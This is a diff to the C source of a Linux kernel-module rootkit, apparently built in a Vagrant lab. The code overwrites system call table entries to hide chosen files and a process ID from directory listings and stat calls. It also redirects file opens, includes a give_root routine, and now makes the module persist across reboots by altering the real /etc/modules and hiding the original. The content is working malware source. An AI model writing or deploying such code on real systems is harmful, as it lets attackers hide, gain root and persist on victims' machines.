@@ -31,33 +31,22 @@
 #define SIG_UNHIDE 34
 #define SIG_HIDEPID 35
 
-// this is the filename we want to hide
+// this are the filenames we want to hide
 // used in hacked_getdents(...)
-// #define TO_HIDE "test_file.txt"
-const int   TO_HIDE_SIZE = 2;
-const char* TO_HIDE[]    = { "test_file.txt\0", "fake_modules_original.txt\0" };
+const int   TO_HIDE_SIZE = 3;
+const char* TO_HIDE[]    = { "test_file.txt", "fake_modules_original.txt", "/etc/modules_original" };
 char hidePID[6] = "-1";
 
-// this is the c file which will replace /sbin/init
-// - it loads the rootkit then runs the original /sbin/init
-// #define FILE_INIT_REPLACEMENT_C      "/vagrant/start_rootkit.c\0"
-// #define FILE_INIT_REPLACEMENT_OUTPUT "/vagrant/start_rootkit\0"
-// #define FILE_INIT               "/sbin/init"
-// #define FILE_INIT_ORIGINAL      "/sbin/init_original"
-// #define FILE_INIT               "/vagrant/init_temp"
-// #define FILE_INIT_ORIGINAL      "/vagrant/init_temp_original"
-#define FILE_MODULES               "/etc/modules_copy\0"
-#define FILE_MODULES_ORIGINAL      "/etc/modules_copy_original\0"
+// location of modules file
+#define FILE_MODULES               "/etc/modules\0"
+#define FILE_MODULES_ORIGINAL      "/etc/modules_original\0"
 #define FILE_TO_APPEND             "/lib/modules/3.2.0-126-generic/kernel/drivers/rootkit/to_append.txt"
 
 // 'map' for replacement open operations
 // e.g. trying to open dog.txt will get you red.txt instead
-// use linked list instead?
 const int   replacement_size     = 1;
-// const char* replacement_keys[]   = { "/home/vagrant/redirect/dog.txt\0", "/home/vagrant/redirect/cat.txt\0",  "/home/vagrant/redirect/test_prog\0" };
-// const char* replacement_values[] = { "/home/vagrant/redirect/red.txt\0", "/home/vagrant/redirect/blue.txt\0", "/home/vagrant/redirect/test_prog_redirect\0" };
-const char* replacement_keys[]   = { "/home/vagrant/pretend_sbin/fake_modules.txt\0" };
-const char* replacement_values[] = { "/home/vagrant/pretend_sbin/fake_modules_original.txt\0" };
+const char* replacement_keys[]   = { "/etc/modules\0" };
+const char* replacement_values[] = { "/etc/modules_original\0" };
 
 // 1 = custom boot-loader installed; run modified syscalls
 // 0 = custom boot-loader not yet installed; don't use modified syscalls
@@ -69,9 +58,6 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 asmlinkage int (*original_stat)(const char *path, struct stat *buf);
 asmlinkage int (*original_lstat)(const char *path, struct stat *buf);
 asmlinkage int (*original_open)(const char __user *pathname, int flags, mode_t mode);
-asmlinkage int (*original_openat)(int dirfd, const char* pathname, int flags, mode_t mode);
-asmlinkage int (*original_access)(const char *pathname, int mode);
-asmlinkage int (*original_execve)(const char *pathname, char* const argv[], char* const envp[]);
 
 struct list_head *module_list;
 
@@ -89,12 +75,6 @@ void update_sys_calls(void **sys_call_table){
     void *modified_function_lstat = hacked_lstat;
     void **modified_at_address_open = &sys_call_table[__NR_open];
     void *modified_function_open = hacked_open;
-    void **modified_at_address_access = &sys_call_table[__NR_access];
-    void *modified_function_access = hacked_access;
-    void **modified_at_address_openat = &sys_call_table[__NR_openat];
-    void *modified_function_openat = hacked_openat;
-    void **modified_at_address_execve = &sys_call_table[__NR_execve];
-    void *modified_function_execve = hacked_execve;
 
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
@@ -103,9 +83,6 @@ void update_sys_calls(void **sys_call_table){
     original_stat = xchg(modified_at_address_stat, modified_function_stat);
     original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
     original_open = xchg(modified_at_address_open, modified_function_open);
-    // original_access = xchg(modified_at_address_access, modified_function_access);
-    // original_openat = xchg(modified_at_address_openat, modified_function_openat);
-    // original_execve = xchg(modified_at_address_execve, modified_function_execve);
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -122,12 +99,6 @@ void revert_to_original(void **sys_call_table){
     void *modified_function_lstat = original_lstat;
     void **modified_at_address_open = &sys_call_table[__NR_open];
     void *modified_function_open = original_open;
-    void **modified_at_address_access = &sys_call_table[__NR_access];
-    void *modified_function_access = original_access;
-    void **modified_at_address_openat = &sys_call_table[__NR_openat];
-    void *modified_function_openat = original_openat;
-    void **modified_at_address_execve = &sys_call_table[__NR_execve];
-    void *modified_function_execve = original_execve;
 
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
@@ -136,9 +107,6 @@ void revert_to_original(void **sys_call_table){
     original_stat = xchg(modified_at_address_stat, modified_function_stat);
     original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
     original_open = xchg(modified_at_address_open, modified_function_open);
-    // original_access = xchg(modified_at_address_access, modified_function_access);
-    // original_openat = xchg(modified_at_address_openat, modified_function_openat);
-    // original_execve = xchg(modified_at_address_execve, modified_function_execve);
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -193,7 +161,7 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
         // & move on
         for (j = 0; j < TO_HIDE_SIZE; j++) {
             char* to_hide = TO_HIDE[j];
-            if (strncmp(cur->d_name, to_hide, strlen(to_hide)) == 0 || strncmp(cur->d_name, hidePID, strlen(hidePID)) == 0) {
+            if (strncmp(cur->d_name, to_hide, strlen(cur->d_name)) == 0 || strncmp(cur->d_name, hidePID, strlen(hidePID)) == 0) {
                 printk("Tried to getdents %s; hiding...\n", to_hide);
                 // length of the linux_dirent
                 int reclen = cur->d_reclen;
@@ -244,16 +212,6 @@ asmlinkage int hacked_stat(const char *path, struct stat *buf) {
             printk("Tried to stat %s; hiding...\n", to_hide);
             return -ENOENT;
         } else {
-            // check for replacement as well
-            // for (i = 0; i < replacement_size; i++) {
-            //     // check if pathname is in map
-            //     if (strncmp(path, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
-            //         // redirect to replacement file
-            //         printk("tried to stat %s; redirecting stat from %s to %s...\n", path, replacement_keys[i], replacement_values[i]);
-            //         return original_stat(replacement_values[i], buf);
-            //     }
-            // }
-
             return original_stat(path, buf);
         }
     }
@@ -268,16 +226,6 @@ asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
             printk("Tried to lstat %s; hiding...\n", to_hide);
             return -ENOENT;
         } else {
-            // check for replacement as well
-            // for (i = 0; i < replacement_size; i++) {
-            //     // check if pathname is in map
-            //     if (strncmp(path, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
-            //         // redirect to replacement file
-            //         printk("tried to lstat %s; redirecting lstat from %s to %s...\n", path, replacement_keys[i], replacement_values[i]);
-            //         return original_stat(replacement_values[i], buf);
-            //     }
-            // }
-
             return original_lstat(path, buf);
         }
     }
@@ -286,7 +234,6 @@ asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
 asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) {
     if (boot_loader_init == 1) {
         // this can use relative path as well so we need to check only the filename.
-        // probs not great
         const char* pathname_stripped = strip_filepath(pathname);
 
         int i;
@@ -315,65 +262,7 @@ asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) 
 }
 
 asmlinkage int hacked_openat(int dirfd, const char *pathname, int flags, mode_t mode) {
-    // const char* filename = strip_filepath(pathname);
-    // int i;
-    // for (i = 0; i < replacement_size; i++) {
-    //     const char* replacement_stripped = strip_filepath(replacement_keys[i]);
-    //     // check if pathname is in map
-    //     if (strncmp(filename, replacement_stripped, strlen(replacement_stripped)) == 0) {
-    //         const char* replacement_value_stripped = strip_filepath(replacement_values[i]);
-    //         // redirect to replacement file
-    //         printk("tried to openat %s; redirecting openat from %s to %s...\n", pathname, replacement_stripped, replacement_value_stripped);
-    //         return original_openat(dirfd, replacement_value_stripped, flags, mode);
-    //     } else {
-    //         printk("openat: %s & %s didn't compare\n", filename, replacement_stripped);
-    //     }
-    // }
-
     return original_openat(dirfd, pathname, flags, mode);
-}
-
-asmlinkage int hacked_access(const char* pathname, int mode) {
-    int i;
-    for (i = 0; i < replacement_size; i++) {
-        // check if pathname is in map
-        if (strncmp(pathname, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
-            // redirect to replacement file
-            printk("tried to open %s; redirecting open from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
-            return original_access(replacement_values[i], mode);
-        }
-    }
-
-    return original_access(pathname, mode);
-}
-
-asmlinkage int hacked_execve(const char* pathname, char* const argv[], char* const envp[]) {
-    // if (boot_loader_init == 1) {
-    //     const char* pathname_stripped = strip_filepath(pathname);
-
-    //     int i;
-    //     for (i = 0; i < replacement_size; i++) {
-    //         // check if pathname is in map
-    //         const char* replacement_key_stripped = strip_filepath(replacement_keys[i]);
-    //         if (strncmp(pathname_stripped, replacement_key_stripped, strlen(replacement_key_stripped)) == 0) {
-    //             // redirect to replacement file
-    //             printk("tried to execve %s; redirecting execve from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
-
-    //             // use user file system
-    //             mm_segment_t old_fs = get_fs();
-    //             set_fs(get_ds());
-
-    //             int fd = original_execve(replacement_values[i], argv, envp);
-
-    //             // return to kernel space
-    //             set_fs(old_fs);
-
-    //             return fd;
-    //         }
-    //     }
-    // }
-
-    return original_execve(pathname, argv, envp);
 }
 
 void give_root(void)
@@ -653,15 +542,6 @@ int does_file_exist(const char* filename) {
     return ret;
 }
 
-// umode_t get_file_permissions(const char* filename) {
-//     struct kstat file_stat;
-//     vfs_stat(filename, &file_stat);
-//     // printk("st_mode mod: %o\n", file_stat.mode & 0x0FFF);
-//     printk("file_stat.mode: %o\n", file_stat.mode);
-//     printk("file_stat.mode mod: %o\n", file_stat.mode & 0x0FFF);
-//     return (file_stat.mode & 0x0FFF);
-// }
-
 umode_t get_file_permissions(const char* filename) {
     int ret;
     struct file *filp = NULL;
@@ -715,7 +595,6 @@ void set_file_permissions(const char* filename, int file_perms) {
 
 // runs a bash command
 int run_bash(char* command) {
-    // system("sudo sed -i 's/#\\?\\(LogLevel\\s*\\).*$/\\1 QUIET/' /etc/ssh/sshd_config");
     int res;
     char* argv[4];
     char* envp[4];
@@ -734,101 +613,9 @@ int run_bash(char* command) {
     return res;
 }
 
-// could have just placed this in lib/modules/<kernel_ver>/default,
-// but this is more interesting!
-// most of this should only be executed on the first
-// run (ideally)
-// - should this be done in our payload instead?
-//   doing file I/O is bad in kernel modules
 
-// also could have been done w/ other hidden program
-
-// also could have just called execve instead?
 void add_to_reboot() {
-    //clone_file("/home/vagrant/dog.txt", "/home/vagrant/dog_copy.txt");
-    // clone_file("/home/vagrant/start_rootkit", "/home/vagrant/start_rootkit_copy");
-
-    // rename_file("/home/vagrant/rename_me.txt", "/home/vagrant/rename_me_ok_then.txt");
-
-    // check for existence of /sbin/init_original
-    // if (!access(FILE_INIT_ORIGINAL, R_OK) == 0) {
-        // no  -> copy /sbin/init -> /sbin/init_original
-        
-        // char copy_command[4 + strlen(FILE_INIT) + strlen(FILE_INIT_ORIGINAL)];
-        // sprintf(copy_command, "cp %s %s", FILE_INIT, FILE_INIT_ORIGINAL);
-        // int return_copy = system(copy_command);
-        
-        //     -> compile start_rootkit.c -> /sbin/init
-        // char compile_command[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT)];
-        // sprintf(compile_command, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT);
-
-        //     -> move our replacement init -> /sbin/init
-
-    // }
-
-    // delete file if it exists ?
-
-    // check renamed init doesn't exist
-
-    // int exists = does_file_exist(FILE_INIT_ORIGINAL);
-    // printk("file exists: %d", exists);
-
-    // struct kstat file_stat;
-    // vfs_stat("/home/vagrant/dog_copy.txt", &file_stat);
-    // printk("file_stat.mode: %o\n", file_stat.mode);
-    // printk("file_stat.mode mod: %o\n", file_stat.mode & 0x0FFF);
-
-    // vfs_stat("/home/vagrant/dog.txt", &file_stat);
-    // printk("file_stat.mode: %o\n", file_stat.mode);
-    // printk("file_stat.mode mod: %o\n", file_stat.mode & 0x0FFF);
-
-    // REALLY NEED to check if file exists!
-
     boot_loader_init = 0;
-    // we only need to replace one i.e. if the
-    // 'fake' file doesn't exist
-    // if (does_file_exist(FILE_INIT_ORIGINAL) == 0) {    
-        int ret;
-
-        // store file permissions of original init
-        // umode_t orig_perms = get_file_permissions(FILE_INIT);
-
-        // rename original init
-        // rename_file(FILE_INIT, FILE_INIT_ORIGINAL);
-
-        // compile (/'copy' over replacement init)
-        // compile to same folder (kernel space)
-        // clone_file("modules_replacement.txt", FILE_INIT);
-
-        // char bash_compile[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT_REPLACEMENT_OUTPUT)];
-        // sprintf(bash_compile, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT_REPLACEMENT_OUTPUT);
-        // printk("bash_compile: %s\n", bash_compile);
-        // ret = run_bash(bash_compile);
-        //char bash_compile[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT_REPLACEMENT_OUTPUT)];
-        // sprintf(bash_compile, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT_REPLACEMENT_OUTPUT);
-        // char* bash_compile = "gcc /home/vagrant/pretend_sbin/fake_init.c -o /home/vagrant/pretend_sbin/fake_init";
-        // printk("bash_compile: %s\n", bash_compile);
-        // ret = run_bash(bash_compile);
-        // ret = run_bash(bash_compile);
-        // then copy over to user space
-        //__copy_to_user(to, from, n bytes)
-
-        // set_file_permissions(FILE_INIT, orig_perms);
-        // set_file_permissions(FILE_INIT_ORIGINAL, 777777);
-
-        // set file permissions of original init to stored
-        // char bash_perms_init[7 + 10 + strlen(FILE_INIT) + 25];
-        // sprintf(bash_perms_init, "sudo chmod %o %s &> output.txt", orig_perms, FILE_INIT);
-        // printk("bash_perms_init: %s\n", bash_perms_init);
-        // ret = run_bash(bash_perms_init);
-        // // set file permissions of replacement init to stored
-        // char* bash_perms_repl[7 + 10 + strlen(FILE_INIT_ORIGINAL)];
-        // sprintf(bash_perms_repl, "chmod %o %s", orig_perms, FILE_INIT_ORIGINAL);
-        // printk("bash_perms_repl: %s\n", bash_perms_repl);
-        // ret = run_bash(bash_perms_repl);
-    // }
-
-    // delete_file("/home/vagrant/append_fun/try_deleting_me");
 
     // first boot only
     if (!does_file_exist(FILE_MODULES_ORIGINAL)) {
@@ -838,7 +625,7 @@ void add_to_reboot() {
         append_to_file(FILE_TO_APPEND, FILE_MODULES);
     }
 
-    // redirect all access during
+    // (redirect all access to FILE_MODULES during rootkit run)
     
     boot_loader_init = 1;
 }
@@ -855,6 +642,5 @@ void add_to_reboot_exit() {
     rename_file(FILE_MODULES_ORIGINAL, FILE_MODULES);
     clone_file(FILE_MODULES, FILE_MODULES_ORIGINAL);
     append_to_file(FILE_TO_APPEND, FILE_MODULES);
-    // printk("why crash\n");
     boot_loader_init = 1;
 }
